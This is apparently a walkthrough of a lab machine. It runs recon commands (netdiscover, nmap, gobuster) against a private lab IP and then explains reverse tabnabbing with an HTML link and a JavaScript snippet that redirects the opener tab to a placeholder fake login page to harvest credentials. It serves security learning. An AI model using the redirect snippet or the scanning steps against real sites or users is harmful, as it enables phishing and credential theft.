1. Detect which devices are online on the same subnet.
     ```bash
     sudo netdiscover -i eth0
     ```
     ![image](https://hackmd.io/_uploads/H1Vsfq48le.png)
2. Scan the IP.
    ```bash
    nmap 192.168.101.131 -sV
    ```
    ![image](https://hackmd.io/_uploads/B1ZMONjUex.png)
3. Enumerate directories and files.
    ```bash
    gobuster dir -u http://192.168.101.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
    ```
    ![image](https://hackmd.io/_uploads/ByUwGPo8gx.png)
4. Open the web page.
    ![image](https://hackmd.io/_uploads/ByNrYEoUle.png)
5. Register an account.
    ![image](https://hackmd.io/_uploads/rkHBfwo8gx.png)
6. Determine the vulnerability type.
    - "Tabnapping" (also called reverse tabnabbing) is a phishing-style attack related to `target="_blank"`.
    - What is tabnapping?
      When a page A contains a link to page B and uses `target="_blank"`, page B (the newly opened tab) can access `window.opener` and change the original page's location.
    ```html
    <a href="http://malicious-site.com" target="_blank">Click here for something interesting</a>
    ```
    The attacker can place malicious JavaScript on `malicious-site.com`.

    Attack flow:
    - The user clicks the link from the trusted website A.
    - A new tab opens with the malicious website B.
    - Malicious JavaScript executes and uses `window.opener.location` to redirect the original tab to a fake login page.
    ```javascript
    if (window.opener) {
      window.opener.location.replace('http://fake-login-page.com');
    }
    ```
    - The user returns to the original tab and sees a page that looks identical to the legitimate one but is a fake login page.
    - The user enters their username and password, which are then sent to the attacker.
